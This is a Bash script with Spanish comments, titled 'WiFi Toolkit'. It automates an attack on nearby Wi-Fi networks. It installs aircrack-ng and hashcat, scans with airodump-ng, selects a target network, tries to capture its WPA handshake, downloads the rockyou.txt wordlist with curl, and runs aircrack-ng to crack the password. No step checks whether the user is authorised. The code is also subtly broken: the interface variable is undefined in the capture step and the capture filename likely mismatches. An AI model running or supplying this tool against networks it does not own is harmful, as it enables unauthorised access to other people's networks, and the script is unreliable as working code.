#!/bin/bash

# Colores para salida
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# Ruta de carpetas
PROJECT_DIR="$HOME/wifi_toolkit"
RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")

# Instalar dependencias
install_dependencies() {
    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            sudo apt-get install -y "$dep" &>/dev/null || {
                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                exit 1
            }
        fi
    done
}

# Detectar interfaz inalámbrica
detect_wireless_interface() {
    iw dev | grep Interface | awk '{print $2}' | head -n 1
}

# Escaneo de redes WiFi
scan_networks() {
    local interface=$(detect_wireless_interface)
    if [[ -z "$interface" ]]; then
        dialog --title "Error" --msgbox "No se encontró una interfaz inalámbrica activa." 8 40
        exit 1
    fi

    dialog --title "Escaneo de Redes" --infobox "Escaneando redes disponibles..." 8 40
    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/network_scan" &
    sleep 15
    killall airodump-ng

    scan_file="$RESULTS_DIR/network_scan-01.csv"
    if [[ ! -f "$scan_file" ]]; then
        dialog --title "Error" --msgbox "No se encontraron redes disponibles." 8 40
        exit 1
    fi

    select_best_network "$scan_file"
}

# Seleccionar la mejor red
select_best_network() {
    local scan_file=$1
    local best_network=$(awk -F, 'NR>2 {if($9 > -100 && $6 != "<length>") print $1, $14}' "$scan_file" | sort -n -k2 | head -n 1)

    if [[ -z "$best_network" ]]; then
        dialog --title "Error" --msgbox "No se encontró una red con buena señal." 8 40
        exit 1
    fi

    local bssid=$(echo "$best_network" | awk '{print $1}')
    local essid=$(echo "$best_network" | awk '{print $2}')
    local user_choice=$(dialog --title "Red Detectada" --yesno "Se detectó la red: $essid ($bssid)\n¿Deseas iniciar el ataque?" 10 50)

    if [[ $? -eq 0 ]]; then
        start_attack "$bssid" "$essid"
    else
        dialog --title "Cancelado" --msgbox "Operación cancelada por el usuario." 8 40
    fi
}

# Iniciar ataque
start_attack() {
    local bssid=$1
    local essid=$2
    local cap_file="$RESULTS_DIR/capture.cap"

    dialog --title "Capturando Handshake" --infobox "Iniciando captura del handshake para $essid..." 8 40
    xterm -hold -e "airodump-ng --bssid $bssid -w $RESULTS_DIR/capture $interface" &
    sleep 30
    killall airodump-ng

    if [[ -f "$cap_file" ]]; then
        crack_handshake "$cap_file" "$bssid" "$essid"
    else
        dialog --title "Error" --msgbox "No se capturó el handshake de la red $essid." 8 40
        exit 1
    fi
}

# Cracking del handshake
crack_handshake() {
    local cap_file=$1
    local bssid=$2
    local essid=$3
    local dictionary="$PROJECT_DIR/rockyou.txt"

    if [[ ! -f "$dictionary" ]]; then
        dialog --title "Descargando Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
    fi

    dialog --title "Cracking" --infobox "Iniciando el ataque contra $essid..." 8 40
    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $cap_file" &
    sleep 10

    dialog --title "Resultado" --msgbox "El proceso de ataque ha finalizado. Revisa los resultados en la terminal." 8 40
}

# Menú principal
main_menu() {
    while true; do
        option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
            1 "Instalar dependencias" \
            2 "Escanear redes WiFi" \
            3 "Salir" 3>&1 1>&2 2>&3)

        case $option in
            1) install_dependencies ;;
            2) scan_networks ;;
            3) clear; exit 0 ;;
            *) dialog --title "Error" --msgbox "Opción inválida." 8 40 ;;
        esac
    done
}

# Preparación e inicio
install_dependencies
mkdir -p "$RESULTS_DIR"
main_menu
